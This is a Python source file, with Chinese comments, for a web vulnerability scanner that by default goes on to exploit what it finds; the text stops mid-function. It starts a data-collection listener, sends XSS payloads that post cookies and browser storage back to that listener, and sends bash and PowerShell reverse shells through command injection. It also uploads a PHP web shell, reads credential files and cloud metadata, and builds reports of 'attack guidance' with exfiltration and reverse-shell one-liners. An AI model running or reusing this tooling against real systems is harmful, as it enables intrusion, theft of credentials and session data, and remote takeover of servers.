from vuln_database import VulnDatabase
import requests
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urljoin, urlparse
import concurrent.futures
import base64
import subprocess
import socket

class VulnerabilityScanner:
    def __init__(self, auto_exploit=True):
        self.vuln_db = VulnDatabase()
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.discovered_vulns = []
        self.exploitation_results = []
        self.auto_exploit = auto_exploit
        self.listener_ip = socket.gethostbyname(socket.gethostname())
        self.listener_port = 4444
        
        # 如果开启自动化攻击，启动监听服务器
        if self.auto_exploit:
            self._start_listener()

    def _start_listener(self):
        """启动监听服务器"""
        try:
            import threading
            from http.server import HTTPServer, BaseHTTPRequestHandler
            
            class DataCollector(BaseHTTPRequestHandler):
                def do_POST(self):
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    print(f"[+] 收到数据: {post_data.decode('utf-8')}")
                    self.send_response(200)
                    self.end_headers()
                    
            def run_server():
                server = HTTPServer(('0.0.0.0', self.listener_port), DataCollector)
                print(f"[*] 监听服务器启动在 {self.listener_ip}:{self.listener_port}")
                server.serve_forever()
                
            threading.Thread(target=run_server, daemon=True).start()
        except Exception as e:
            print(f"[-] 启动监听服务器失败: {str(e)}")

    def scan_target(self, target_url):
        """对目标URL进行全面扫描"""
        print(f"[*] 开始扫描目标: {target_url}")
        
        # 获取所有输入点
        input_points = self._get_input_points(target_url)
        print(f"[*] 发现 {len(input_points)} 个可能的输入点")
        
        # 1. XSS漏洞检测和利用
        print("\n[*] 开始XSS漏洞扫描...")
        self._scan_xss(target_url)
        
        # 2. SQL注入检测和利用
        print("\n[*] 开始SQL注入扫描...")
        self._scan_sqli(target_url)
        
        # 3. 文件包含漏洞检测和利用
        print("\n[*] 开始文件包含漏洞扫描...")
        self._scan_file_inclusion(target_url)
        
        # 4. 命令注入检测和利用
        print("\n[*] 开始命令注入扫描...")
        self._scan_command_injection(target_url)
        
        # 5. SSRF漏洞检测
        print("\n[*] 开始SSRF漏洞扫描...")
        self._scan_ssrf(target_url)
        
        # 6. 目录遍历漏洞检测
        print("\n[*] 开始目录遍历漏洞扫描...")
        self._scan_directory_traversal(target_url)
        
        # 7. 不安全的文件上传
        print("\n[*] 开始文件上传漏洞扫描...")
        self._scan_file_upload(target_url)
        
        # 8. CSRF漏洞检测
        print("\n[*] 开始CSRF漏洞扫描...")
        self._scan_csrf(target_url)
        
        return self.discovered_vulns, self.exploitation_results

    def _scan_ssrf(self, url):
        """SSRF漏洞扫描"""
        ssrf_payloads = self.vuln_db.get_payloads("ssrf")
        input_points = self._get_input_points(url)
        
        for input_point in input_points:
            for vuln in ssrf_payloads:
                try:
                    for payload in vuln.payloads:
                        response = self._test_ssrf(url, input_point, payload)
                        if response and self._is_ssrf_vulnerable(response):
                            self.discovered_vulns.append({
                                'type': 'ssrf',
                                'url': url,
                                'parameter': input_point,
                                'payload': payload,
                                'severity': vuln.severity,
                                'remediation': vuln.remediation
                            })
                            print(f"[!] 发现SSRF漏洞: {url} - {input_point}")
                            if self.auto_exploit:
                                self._exploit_ssrf(url, input_point, payload)
                except Exception as e:
                    print(f"[-] SSRF测试出错: {str(e)}")

    def _scan_directory_traversal(self, url):
        """目录遍历漏洞扫描"""
        traversal_payloads = self.vuln_db.get_payloads("directory_traversal")
        input_points = self._get_input_points(url)
        
        for input_point in input_points:
            for vuln in traversal_payloads:
                try:
                    for payload in vuln.payloads:
                        response = self._test_directory_traversal(url, input_point, payload)
                        if response and self._is_directory_traversal_vulnerable(response):
                            self.discovered_vulns.append({
                                'type': 'directory_traversal',
                                'url': url,
                                'parameter': input_point,
                                'payload': payload,
                                'severity': vuln.severity,
                                'remediation': vuln.remediation
                            })
                            print(f"[!] 发现目录遍历漏洞: {url} - {input_point}")
                            if self.auto_exploit:
                                self._exploit_directory_traversal(url, input_point, payload)
                except Exception as e:
                    print(f"[-] 目录遍历测试出错: {str(e)}")

    def _scan_file_upload(self, url):
        """不安全的文件上传漏洞扫描"""
        upload_payloads = self.vuln_db.get_payloads("file_upload")
        
        # 查找上传点
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            upload_forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
            
            for form in upload_forms:
                for vuln in upload_payloads:
                    try:
                        for payload in vuln.payloads:
                            if self._test_file_upload(url, form, payload):
                                self.discovered_vulns.append({
                                    'type': 'file_upload',
                                    'url': url,
                                    'parameter': form.get('action', ''),
                                    'payload': payload,
                                    'severity': vuln.severity,
                                    'remediation': vuln.remediation
                                })
                                print(f"[!] 发现不安全的文件上传: {url}")
                                if self.auto_exploit:
                                    self._exploit_file_upload(url, form, payload)
                    except Exception as e:
                        print(f"[-] 文件上传测试出错: {str(e)}")
        except Exception as e:
            print(f"[-] 查找上传点时出错: {str(e)}")

    def _scan_csrf(self, url):
        """CSRF漏洞扫描"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                if not self._has_csrf_protection(form):
                    self.discovered_vulns.append({
                        'type': 'csrf',
                        'url': url,
                        'parameter': form.get('action', ''),
                        'payload': '跨站请求伪造',
                        'severity': 'high',
                        'remediation': '实施CSRF令牌，验证Referer头，使用SameSite Cookie属性'
                    })
                    print(f"[!] 发现CSRF漏洞: {url}")
                    if self.auto_exploit:
                        self._exploit_csrf(url, form)
        except Exception as e:
            print(f"[-] CSRF测试出错: {str(e)}")

    def _has_csrf_protection(self, form):
        """检查表单是否有CSRF保护"""
        # 检查是否有CSRF token
        csrf_fields = form.find_all('input', {'name': re.compile(r'csrf|token|nonce', re.I)})
        if csrf_fields:
            return True
        
        # 检查是否有自定义头部要求
        headers = self.session.headers
        if 'X-CSRF-Token' in headers or 'X-XSRF-Token' in headers:
            return True
        
        return False

    def _test_ssrf(self, url, input_point, payload):
        """测试SSRF漏洞"""
        try:
            params = {input_point: payload}
            return self.session.get(url, params=params)
        except:
            return None

    def _test_directory_traversal(self, url, input_point, payload):
        """测试目录遍历漏洞"""
        try:
            params = {input_point: payload}
            return self.session.get(url, params=params)
        except:
            return None

    def _test_file_upload(self, url, form, payload):
        """测试文件上传漏洞"""
        try:
            # 创建恶意文件
            files = {'file': ('test.php', payload, 'application/x-php')}
            
            # 获取表单数据
            data = {}
            for input_tag in form.find_all('input'):
                if input_tag.get('name') and input_tag.get('value'):
                    data[input_tag['name']] = input_tag['value']
                    
            # 发送上传请求
            upload_url = urljoin(url, form.get('action', ''))
            response = self.session.post(upload_url, files=files, data=data)
            
            return self._is_file_upload_vulnerable(response)
        except:
            return False

    def _is_ssrf_vulnerable(self, response):
        """检查是否存在SSRF漏洞"""
        if not response:
            return False
        
        # 检查是否包含内网IP地址
        internal_ips = [
            "10\\.",
            "172\\.(1[6-9]|2[0-9]|3[0-1])\\.",
            "192\\.168\\.",
            "127\\.",
            "localhost",
            "0\\.0\\.0\\.0"
        ]
        
        return any(re.search(pattern, response.text) for pattern in internal_ips)

    def _is_directory_traversal_vulnerable(self, response):
        """检查是否存在目录遍历漏洞"""
        if not response:
            return False
        
        # 检查是否包含敏感文件内容
        patterns = [
            "root:.*:0:0:",  # Unix密码文件
            "\\[boot loader\\]",  # Windows系统文件
            "\\[operating systems\\]",
            "<?php",  # PHP源代码
            "web.config",  # IIS配置文件
            "httpd.conf"  # Apache配置文件
        ]
        
        return any(re.search(pattern, response.text) for pattern in patterns)

    def _is_file_upload_vulnerable(self, response):
        """检查是否存在不安全的文件上传"""
        if not response:
            return False
        
        # 检查上传是否成功
        success_patterns = [
            "upload.*success",
            "file.*uploaded",
            "success.*upload",
            "上传.*成功",
            "成功.*上传"
        ]
        
        # 检查是否返回了文件URL
        url_patterns = [
            "url.*:",
            "path.*:",
            "file.*:",
            "location.*:"
        ]
        
        return (
            any(re.search(pattern, response.text, re.I) for pattern in success_patterns) or
            any(re.search(pattern, response.text, re.I) for pattern in url_patterns)
        )

    def _exploit_ssrf(self, url, input_point, payload):
        """利用SSRF漏洞"""
        try:
            # 尝试访问内网系统
            internal_endpoints = [
                "http://localhost/admin",
                "http://127.0.0.1:8080/",
                "http://192.168.1.1/",
                "file:///etc/passwd",
                "http://169.254.169.254/latest/meta-data/"  # AWS元数据
            ]
            
            for endpoint in internal_endpoints:
                params = {input_point: endpoint}
                response = self.session.get(url, params=params)
                
                if response.status_code == 200:
                    self.exploitation_results.append({
                        'type': 'ssrf',
                        'url': url,
                        'parameter': input_point,
                        'payload': endpoint,
                        'result': f'成功访问内网端点: {endpoint}'
                    })
                    return True
        except Exception as e:
            print(f"[-] SSRF利用失败: {str(e)}")
        return False

    def _exploit_directory_traversal(self, url, input_point, payload):
        """利用目录遍历漏洞"""
        try:
            # 尝试读取敏感文件
            sensitive_files = [
                "/etc/passwd",
                "/etc/shadow",
                "../../wp-config.php",
                "../../../.env",
                "C:\\Windows\\win.ini",
                "/var/log/apache2/access.log"
            ]
            
            for file_path in sensitive_files:
                params = {input_point: file_path}
                response = self.session.get(url, params=params)
                
                if self._is_directory_traversal_vulnerable(response):
                    self.exploitation_results.append({
                        'type': 'directory_traversal',
                        'url': url,
                        'parameter': input_point,
                        'payload': file_path,
                        'result': f'成功读取文件: {file_path}'
                    })
                    return True
        except Exception as e:
            print(f"[-] 目录遍历利用失败: {str(e)}")
        return False

    def _exploit_file_upload(self, url, form, payload):
        """利用不安全的文件上传"""
        try:
            # 创建WebShell
            webshell_content = """<?php
            if(isset($_POST['cmd'])) {
                echo "<pre>";
                system($_POST['cmd']);
                echo "</pre>";
            }
            ?>"""
            
            # 尝试不同的文件扩展名
            extensions = ['.php', '.php5', '.phtml', '.php.jpg', '.php;.jpg']
            
            for ext in extensions:
                files = {'file': (f'shell{ext}', webshell_content, 'application/octet-stream')}
                data = {}
                for input_tag in form.find_all('input'):
                    if input_tag.get('name') and input_tag.get('value'):
                        data[input_tag['name']] = input_tag['value']
                        
                upload_url = urljoin(url, form.get('action', ''))
                response = self.session.post(upload_url, files=files, data=data)
                
                if self._is_file_upload_vulnerable(response):
                    shell_url = self._extract_uploaded_file_url(response)
                    if shell_url:
                        self.exploitation_results.append({
                            'type': 'file_upload',
                            'url': url,
                            'parameter': form.get('action', ''),
                            'payload': f'shell{ext}',
                            'result': f'成功上传WebShell: {shell_url}'
                        })
                        return True
        except Exception as e:
            print(f"[-] 文件上传利用失败: {str(e)}")
        return False

    def _exploit_csrf(self, url, form):
        """利用CSRF漏洞"""
        try:
            # 生成CSRF POC
            poc_html = f"""
            <html>
                <body>
                    <form id="csrf-form" action="{form.get('action', url)}" method="{form.get('method', 'POST')}">
            """
            
            # 添加表单字段
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    poc_html += f'<input type="hidden" name="{input_tag["name"]}" value="{input_tag.get("value", "")}">\n'
                    
            poc_html += """
                    </form>
                    <script>
                        document.getElementById("csrf-form").submit();
                    </script>
                </body>
            </html>
            """
            
            # 保存POC
            poc_file = f'csrf_poc_{int(time.time())}.html'
            with open(poc_file, 'w') as f:
                f.write(poc_html)
                
            self.exploitation_results.append({
                'type': 'csrf',
                'url': url,
                'parameter': form.get('action', ''),
                'payload': 'CSRF POC',
                'result': f'已生成CSRF POC: {poc_file}'
            })
            return True
        except Exception as e:
            print(f"[-] CSRF利用失败: {str(e)}")
        return False

    def _extract_uploaded_file_url(self, response):
        """从响应中提取上传文件的URL"""
        # 尝试从响应中提取URL
        url_patterns = [
            r'https?://[^\s<>"]+?\.php\b',
            r'(/uploads/[^\s<>"]+?\.php\b)',
            r'(files/[^\s<>"]+?\.php\b)'
        ]
        
        for pattern in url_patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(0)
        return None

    def _exploit_xss(self, url, input_point, payload):
        """利用XSS漏洞"""
        try:
            # 从漏洞库获取更高级的攻击payload
            attack_vulns = self.vuln_db.get_payloads("xss", "stored")
            if attack_vulns:
                # 使用存储型XSS的payload进行攻击
                attack_payload = attack_vulns[0].payloads[0]
            else:
                # 使用默认的数据窃取payload
                attack_payload = f"""
                <script>
                var data = {{
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage)
                }};
                fetch('http://{self.listener_ip}:{self.listener_port}/collect', {{
                    method: 'POST',
                    body: JSON.stringify(data)
                }});
                </script>
                """
            
            # 发送攻击载荷
            params = {input_point: attack_payload}
            response = self.session.get(url, params=params)
            
            if response.status_code == 200:
                self.exploitation_results.append({
                    'type': 'xss',
                    'url': url,
                    'parameter': input_point,
                    'payload': attack_payload,
                    'result': '成功注入XSS payload，等待数据回传'
                })
                return True
        except Exception as e:
            print(f"[-] XSS利用失败: {str(e)}")
        return False

    def _exploit_sqli(self, url, input_point, vuln_type="error_based"):
        """利用SQL注入漏洞"""
        try:
            if vuln_type == "error_based":
                # 尝试读取敏感数据
                payloads = [
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT username,password FROM users--",
                    "' UNION SELECT @@version,NULL--"
                ]
            elif vuln_type == "time_based":
                payloads = [
                    "' AND IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--",
                    "' AND IF(LENGTH(DATABASE())>5,SLEEP(5),0)--"
                ]
            
            for payload in payloads:
                params = {input_point: payload}
                response = self.session.get(url, params=params)
                
                if self._extract_sql_data(response):
                    self.exploitation_results.append({
                        'type': 'sql_injection',
                        'url': url,
                        'parameter': input_point,
                        'payload': payload,
                        'result': self._extract_sql_data(response)
                    })
                    return True
        except Exception as e:
            print(f"[-] SQL注入利用失败: {str(e)}")
        return False

    def _exploit_file_inclusion(self, url, input_point, vuln_type="lfi"):
        """利用文件包含漏洞"""
        try:
            if vuln_type == "lfi":
                # 尝试读取敏感文件
                sensitive_files = [
                    "/etc/passwd",
                    "C:\\Windows\\win.ini",
                    "../../../wp-config.php",
                    "../../.env"
                ]
                
                for file_path in sensitive_files:
                    params = {input_point: file_path}
                    response = self.session.get(url, params=params)
                    
                    if self._extract_file_content(response):
                        self.exploitation_results.append({
                            'type': 'file_inclusion',
                            'url': url,
                            'parameter': input_point,
                            'payload': file_path,
                            'result': self._extract_file_content(response)
                        })
                        return True
                        
            elif vuln_type == "rfi":
                # 尝试包含远程代码
                shell_url = f"http://{self.listener_ip}/shell.php"
                params = {input_point: shell_url}
                response = self.session.get(url, params=params)
                
                if response.status_code == 200:
                    self.exploitation_results.append({
                        'type': 'file_inclusion',
                        'url': url,
                        'parameter': input_point,
                        'payload': shell_url,
                        'result': '成功包含远程文件'
                    })
                    return True
                    
        except Exception as e:
            print(f"[-] 文件包含漏洞利用失败: {str(e)}")
        return False

    def _exploit_command_injection(self, url, input_point):
        """利用命令注入漏洞"""
        try:
            # 创建反向shell payload
            if 'Windows' in self._detect_os(url):
                payload = f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{self.listener_ip}\',{self.listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
            else:
                payload = f'bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1'
            
            # URL编码payload
            encoded_payload = requests.utils.quote(payload)
            
            # 发送payload
            params = {input_point: f";{encoded_payload}"}
            response = self.session.get(url, params=params)
            
            self.exploitation_results.append({
                'type': 'command_injection',
                'url': url,
                'parameter': input_point,
                'payload': payload,
                'result': '命令注入成功，等待反向shell连接'
            })
            return True
            
        except Exception as e:
            print(f"[-] 命令注入利用失败: {str(e)}")
        return False

    def _extract_sql_data(self, response):
        """从SQL注入响应中提取数据"""
        if not response:
            return None
            
        # 尝试从错误消息中提取数据
        patterns = [
            r"UNION SELECT.*?FROM.*?(?=--|#)",  # UNION查询结果
            r"MySQL Result.*?(?=<)",  # MySQL结果
            r"SQL Server.*?(?=<)",    # SQL Server结果
            r"ORA-[0-9]+:.*?(?=<)"    # Oracle错误
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(0)
        return None

    def _extract_file_content(self, response):
        """从文件包含响应中提取文件内容"""
        if not response:
            return None
            
        # 尝试提取敏感信息
        patterns = [
            r"root:.*?(?=\n)",          # Unix密码文件
            r"DB_PASSWORD.*?(?=\n)",     # 数据库配置
            r"API_KEY.*?(?=\n)",         # API密钥
            r"<?php.*?>",                # PHP代码
            r";\s*password.*?(?=;)"      # 密码配置
        ]
        
        extracted = []
        for pattern in patterns:
            matches = re.finditer(pattern, response.text)
            for match in matches:
                extracted.append(match.group(0))
                
        return extracted if extracted else None

    def _detect_os(self, url):
        """检测目标系统类型"""
        try:
            response = self.session.get(url)
            server = response.headers.get('Server', '')
            
            if 'Win' in server or 'Microsoft' in server:
                return 'Windows'
            elif 'Unix' in server or 'Linux' in server:
                return 'Linux'
            else:
                return 'Unknown'
        except:
            return 'Unknown'

    def _scan_xss(self, url):
        """XSS漏洞扫描和利用"""
        print("[*] 开始XSS漏洞扫描")
        
        # 从漏洞库获取XSS payloads和特征
        xss_vulns = self.vuln_db.get_payloads("xss")
        input_points = self._get_input_points(url)
        if not input_points and 'name' in url:
            input_points.add('name')
        
        for input_point in input_points:
            for vuln in xss_vulns:
                try:
                    # 使用漏洞库中的payload进行测试
                    for payload in vuln.payloads:
                        response = self._test_xss(url, input_point, payload)
                        if response:
                            # 使用漏洞库中的特征进行匹配
                            for pattern in vuln.patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    self.discovered_vulns.append({
                                        'type': 'xss',
                                        'url': url,
                                        'parameter': input_point,
                                        'payload': payload,
                                        'severity': vuln.severity,
                                        'remediation': vuln.remediation
                                    })
                                    print(f"[!] 发现XSS漏洞: {url} - {input_point}")
                                    # 自动执行漏洞利用
                                    if self.auto_exploit:
                                        print(f"[*] 开始自动化攻击...")
                                        self._exploit_xss(url, input_point, payload)
                                    break
                except Exception as e:
                    print(f"[-] XSS测试出错: {str(e)}")

    def _scan_sqli(self, url):
        """SQL注入漏洞扫描和利用"""
        print("[*] 开始SQL注入扫描")
        
        sqli_payloads = self.vuln_db.get_payloads("sql_injection")
        input_points = self._get_input_points(url)
        
        for input_point in input_points:
            for payload in sqli_payloads:
                try:
                    base_response = self._get_base_response(url, input_point)
                    response = self._test_sqli(url, input_point, payload)
                    
                    if response and self._is_sqli_vulnerable(response, base_response):
                        similar_vulns = self.vuln_db.find_similar_vulnerabilities(
                            f"在{input_point}处发现SQL注入漏洞"
                        )
                        if similar_vulns:
                            vuln = similar_vulns[0]
                            self.discovered_vulns.append({
                                'type': 'sql_injection',
                                'url': url,
                                'parameter': input_point,
                                'payload': payload,
                                'severity': vuln.severity,
                                'remediation': vuln.remediation
                            })
                            print(f"[!] 发现SQL注入漏洞: {url} - {input_point}")
                            # 执行漏洞利用
                            if self._exploit_sqli(url, input_point):
                                print(f"[+] SQL注入漏洞利用成功: {url} - {input_point}")
                except Exception as e:
                    print(f"[-] SQL注入测试出错: {str(e)}")

    def _scan_file_inclusion(self, url):
        """文件包含漏洞扫描和利用"""
        print("[*] 开始文件包含漏洞扫描")
        
        lfi_payloads = self.vuln_db.get_payloads("file_inclusion", "lfi")
        rfi_payloads = self.vuln_db.get_payloads("file_inclusion", "rfi")
        input_points = self._get_input_points(url)
        
        for input_point in input_points:
            for payload in lfi_payloads:
                try:
                    response = self._test_file_inclusion(url, input_point, payload)
                    if response and self._is_file_inclusion_vulnerable(response):
                        similar_vulns = self.vuln_db.find_similar_vulnerabilities(
                            f"在{input_point}处发现本地文件包含漏洞"
                        )
                        if similar_vulns:
                            vuln = similar_vulns[0]
                            self.discovered_vulns.append({
                                'type': 'file_inclusion',
                                'subtype': 'lfi',
                                'url': url,
                                'parameter': input_point,
                                'payload': payload,
                                'severity': vuln.severity,
                                'remediation': vuln.remediation
                            })
                            print(f"[!] 发现本地文件包含漏洞: {url} - {input_point}")
                            # 执行漏洞利用
                            if self._exploit_file_inclusion(url, input_point, "lfi"):
                                print(f"[+] 本地文件包含漏洞利用成功: {url} - {input_point}")
                except Exception as e:
                    print(f"[-] 文件包含测试出错: {str(e)}")

    def _scan_command_injection(self, url):
        """命令注入漏洞扫描和利用"""
        print("[*] 开始命令注入扫描")
        
        cmd_payloads = self.vuln_db.get_payloads("command_injection")
        input_points = self._get_input_points(url)
        
        for input_point in input_points:
            for payload in cmd_payloads:
                try:
                    response = self._test_command_injection(url, input_point, payload)
                    if response and self._is_command_injection_vulnerable(response):
                        similar_vulns = self.vuln_db.find_similar_vulnerabilities(
                            f"在{input_point}处发现命令注入漏洞"
                        )
                        if similar_vulns:
                            vuln = similar_vulns[0]
                            self.discovered_vulns.append({
                                'type': 'command_injection',
                                'url': url,
                                'parameter': input_point,
                                'payload': payload,
                                'severity': vuln.severity,
                                'remediation': vuln.remediation
                            })
                            print(f"[!] 发现命令注入漏洞: {url} - {input_point}")
                            # 执行漏洞利用
                            if self._exploit_command_injection(url, input_point):
                                print(f"[+] 命令注入漏洞利用成功: {url} - {input_point}")
                except Exception as e:
                    print(f"[-] 命令注入测试出错: {str(e)}")

    def _get_input_points(self, url):
        """获取页面中的所有可能输入点"""
        input_points = set()
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 获取所有表单输入
            for form in soup.find_all('form'):
                for input_tag in form.find_all(['input', 'textarea']):
                    if input_tag.get('name'):
                        input_points.add(input_tag['name'])
            
            # 获取URL参数
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parsed_url.query.split('&')
                for param in params:
                    if '=' in param:
                        input_points.add(param.split('=')[0])
                        
        except Exception as e:
            print(f"[-] 获取输入点时出错: {str(e)}")
            
        return input_points

    def _test_xss(self, url, input_point, payload):
        """测试XSS漏洞"""
        try:
            encoded_payload = requests.utils.quote(payload)
            if '?' in url:
                test_url = f"{url}&{input_point}={encoded_payload}"
            else:
                test_url = f"{url}?{input_point}={encoded_payload}"
            
            print(f"[*] 测试XSS payload: {test_url}")
            response = self.session.get(test_url)
            return response
            
        except Exception as e:
            print(f"[-] XSS测试出错: {str(e)}")
            return None

    def _test_sqli(self, url, input_point, payload):
        """测试SQL注入漏洞"""
        try:
            params = {input_point: payload}
            return self.session.get(url, params=params)
        except:
            return None

    def _test_file_inclusion(self, url, input_point, payload):
        """测试文件包含漏洞"""
        try:
            params = {input_point: payload}
            return self.session.get(url, params=params)
        except:
            return None

    def _test_command_injection(self, url, input_point, payload):
        """测试命令注入漏洞"""
        try:
            params = {input_point: payload}
            return self.session.get(url, params=params)
        except:
            return None

    def _get_base_response(self, url, input_point):
        """获取基准响应"""
        try:
            params = {input_point: 'test123'}
            return self.session.get(url, params=params)
        except:
            return None

    def _is_sqli_vulnerable(self, response, base_response):
        """检查是否存在SQL注入漏洞"""
        if not response or not base_response:
            return False
            
        # 检查错误消息
        sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "valid MySQL result",
            "MySqlClient\.",
            "PostgreSQL.*ERROR",
            "Warning.*pg_.*",
            "valid PostgreSQL result",
            "Npgsql\.",
            "Driver.* SQL[-_ ]*Server",
            "OLE DB.* SQL Server",
            "SQLServer JDBC Driver",
            "Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            "ODBC SQL Server Driver",
            "ODBC Driver.*SQL Server",
            "SQLServer JDBC Driver",
            "com\.microsoft\.sqlserver\.jdbc",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*oci_.*",
            "Warning.*ora_.*"
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response.text, re.IGNORECASE) and \
               not re.search(pattern, base_response.text, re.IGNORECASE):
                return True
                
        return False

    def _is_file_inclusion_vulnerable(self, response):
        """检查是否存在文件包含漏洞"""
        if not response:
            return False
            
        # 检查是否包含敏感文件内容
        patterns = [
            "root:.*:0:0:",  # Unix密码文件
            "\\[boot loader\\]",  # Windows系统文件
            "\\[operating systems\\]",
            "mysql>",  # 数据库文件
            "<!DOCTYPE.*html",  # 源代码泄露
            "<?php"  # PHP源代码
        ]
        
        return any(re.search(pattern, response.text) for pattern in patterns)

    def _is_command_injection_vulnerable(self, response):
        """检查是否存在命令注入漏洞"""
        if not response:
            return False
            
        # 检查命令执行结果
        patterns = [
            "uid=\\d+\\(\\w+\\) gid=\\d+\\(\\w+\\)",  # id命令输出
            "Directory of",  # Windows dir命令
            "Volume Serial Number",
            "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",  # IP地址（ifconfig/ipconfig输出）
            "Linux.*\\d\\.\\d\\.\\d",  # 系统信息
            "Windows.*\\[Version\\s\\d\\.\\d\\]"
        ]
        
        return any(re.search(pattern, response.text) for pattern in patterns)

    def generate_report(self):
        """生成扫描和利用报告"""
        if not self.discovered_vulns and not self.exploitation_results:
            return "未发现漏洞。"
            
        report = ["# 漏洞扫描和利用报告", ""]
        
        # 漏洞发现部分
        report.append("## 发现的漏洞")
        for vuln in self.discovered_vulns:
            report.append(f"### {vuln['type'].upper()} 漏洞")
            report.append(f"- URL: {vuln['url']}")
            report.append(f"- 参数: {vuln['parameter']}")
            report.append(f"- 严重程度: {vuln['severity']}")
            report.append(f"- 验证载荷: {vuln['payload']}")
            report.append(f"- 修复建议: {vuln['remediation']}")
            report.append("")
            
            # 添加攻击指导
            report.append("#### 攻击指导")
            if vuln['type'] == 'xss':
                report.append("1. 手动攻击步骤：")
                report.append(f"   - 访问目标URL: {vuln['url']}")
                report.append(f"   - 在参数 {vuln['parameter']} 中注入以下payload:")
                report.append(f"   ```javascript")
                report.append(f"   {vuln['payload']}")
                report.append(f"   ```")
                report.append("2. 自动化攻击：")
                report.append("   ```python")
                report.append(f"   import requests")
                report.append(f"   url = '{vuln['url']}'")
                report.append(f"   params = {{'{vuln['parameter']}': '{vuln['payload']}'}}")
                report.append("   response = requests.get(url, params=params)")
                report.append("   ```")
                report.append("")
                report.append("3. 高级利用：")
                report.append("   ```javascript")
                report.append("   // 窃取Cookie")
                report.append("   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>")
                report.append("   // 窃取LocalStorage")
                report.append("   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>")
                report.append("   ```")
            elif vuln['type'] == 'sql_injection':
                report.append("1. 手动攻击步骤：")
                report.append(f"   - 访问目标URL: {vuln['url']}")
                report.append(f"   - 在参数 {vuln['parameter']} 中注入以下payload:")
                report.append("   ```sql")
                report.append(f"   {vuln['payload']}")
                report.append("   ```")
                report.append("2. 自动化攻击：")
                report.append("   ```python")
                report.append(f"   import requests")
                report.append(f"   url = '{vuln['url']}'")
                report.append(f"   params = {{'{vuln['parameter']}': '{vuln['payload']}'}}")
                report.append("   response = requests.get(url, params=params)")
                report.append("   ```")
                report.append("")
                report.append("3. 高级利用：")
                report.append("   ```sql")
                report.append("   -- 获取数据库版本")
                report.append("   ' UNION SELECT @@version,NULL--")
                report.append("   -- 获取数据库名")
                report.append("   ' UNION SELECT database(),NULL--")
                report.append("   -- 获取表名")
                report.append("   ' UNION SELECT table_name,NULL FROM information_schema.tables--")
                report.append("   ```")
            elif vuln['type'] == 'file_inclusion':
                report.append("1. 手动攻击步骤：")
                report.append(f"   - 访问目标URL: {vuln['url']}")
                report.append(f"   - 在参数 {vuln['parameter']} 中注入以下payload:")
                report.append("   ```")
                report.append(f"   {vuln['payload']}")
                report.append("   ```")
                report.append("2. 自动化攻击：")
                report.append("   ```python")
                report.append(f"   import requests")
                report.append(f"   url = '{vuln['url']}'")
                report.append(f"   params = {{'{vuln['parameter']}': '{vuln['payload']}'}}")
                report.append("   response = requests.get(url, params=params)")
                report.append("   ```")
                report.append("")
                report.append("3. 高级利用：")
                report.append("   ```")
                report.append("   # 常见敏感文件")
                report.append("   /etc/passwd")
                report.append("   ../../wp-config.php")
                report.append("   ../../../.env")
                report.append("   # PHP封装器")
                report.append("   php://filter/convert.base64-encode/resource=index.php")
                report.append("   ```")
            elif vuln['type'] == 'command_injection':
                report.append("1. 手动攻击步骤：")
                report.append(f"   - 访问目标URL: {vuln['url']}")
                report.append(f"   - 在参数 {vuln['parameter']} 中注入以下payload:")
                report.append("   ```bash")
                report.append(f"   {vuln['payload']}")
                report.append("   ```")
                report.append("2. 自动化攻击：")
                report.append("   ```python")
                report.append(f"   import requests")
                report.append(f"   url = '{vuln['url']}'")
                report.append(f"   params = {{'{vuln['parameter']}': '{vuln['payload']}'}}")
                report.append("   response = requests.get(url, params=params)")
                report.append("   ```")
                report.append("")
                report.append("3. 高级利用：")
                report.append("   ```bash")
                report.append("   # 反向Shell")
                report.append("   bash -i >& /dev/tcp/攻击者IP/端口 0>&1")
                report.append("   # 或Windows下")
                report.append("   powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('攻击者IP',端口);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'>';$sy=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sy,0,$sy.Length);$s.Flush()};$c.Close()\"")
                report.append("   ```")
            report.append("")
            
        # 漏洞利用部分
        report.append("## 漏洞利用结果")
        for result in self.exploitation_results:
